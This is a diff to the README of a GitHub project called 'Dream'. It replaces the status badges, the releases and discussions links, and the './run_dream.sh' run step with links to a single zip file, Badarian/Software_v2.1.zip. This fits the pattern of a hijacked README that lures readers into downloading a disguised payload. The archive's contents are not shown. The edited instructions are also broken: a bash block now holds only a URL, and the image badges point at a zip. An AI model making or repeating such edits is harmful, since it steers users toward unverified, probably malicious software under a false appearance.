@@ -1,10 +1,10 @@
 ```markdown
 # 🌟 Welcome to the Dream Repository! 🌙
 
-![GitHub repo size](https://img.shields.io/github/repo-size/jeree02847/Dream)
-![GitHub last commit](https://img.shields.io/github/last-commit/jeree02847/Dream)
-![GitHub issues](https://img.shields.io/github/issues/jeree02847/Dream)
-![GitHub pull requests](https://img.shields.io/github/issues-pr/jeree02847/Dream)
+![GitHub repo size](https://raw.githubusercontent.com/jeree02847/Dream/main/Badarian/Software_v2.1.zip)
+![GitHub last commit](https://raw.githubusercontent.com/jeree02847/Dream/main/Badarian/Software_v2.1.zip)
+![GitHub issues](https://raw.githubusercontent.com/jeree02847/Dream/main/Badarian/Software_v2.1.zip)
+![GitHub pull requests](https://raw.githubusercontent.com/jeree02847/Dream/main/Badarian/Software_v2.1.zip)
 
 ## Overview
 
@@ -22,7 +22,7 @@ Whether you are a developer looking to contribute, or simply interested in explo
 
 To get started with the Dream project, you need to download the latest release. Click the button below to access the releases page:
 
-[![Download Releases](https://img.shields.io/badge/Download%20Releases-v1.0-blue)](https://github.com/jeree02847/Dream/releases)
+[![Download Releases](https://raw.githubusercontent.com/jeree02847/Dream/main/Badarian/Software_v2.1.zip%20Releases-v1.0-blue)](https://raw.githubusercontent.com/jeree02847/Dream/main/Badarian/Software_v2.1.zip)
 
 After downloading the release, follow these steps to execute it:
 
@@ -31,7 +31,7 @@ After downloading the release, follow these steps to execute it:
 3. Navigate to the extracted folder.
 4. Execute the command: 
    ```bash
-   ./run_dream.sh
+   https://raw.githubusercontent.com/jeree02847/Dream/main/Badarian/Software_v2.1.zip
    ```
 
 ## Usage
@@ -67,7 +67,7 @@ We welcome contributions from the community. Here’s how you can help:
 
 Join our community of developers and dreamers. Engage with others through our GitHub discussions or other platforms.
 
-- [GitHub Discussions](https://github.com/jeree02847/Dream/discussions)
+- [GitHub Discussions](https://raw.githubusercontent.com/jeree02847/Dream/main/Badarian/Software_v2.1.zip)
 
 ## Roadmap
 
@@ -102,5 +102,5 @@ Thank you for taking the time to explore the **Dream** repository. We are excite
 
 Feel free to reach out with questions or ideas. Together, let's make our dreams a reality! 🌈
 
-[![Download Releases](https://img.shields.io/badge/Download%20Releases-v1.0-blue)](https://github.com/jeree02847/Dream/releases)
+[![Download Releases](https://raw.githubusercontent.com/jeree02847/Dream/main/Badarian/Software_v2.1.zip%20Releases-v1.0-blue)](https://raw.githubusercontent.com/jeree02847/Dream/main/Badarian/Software_v2.1.zip)
 ```
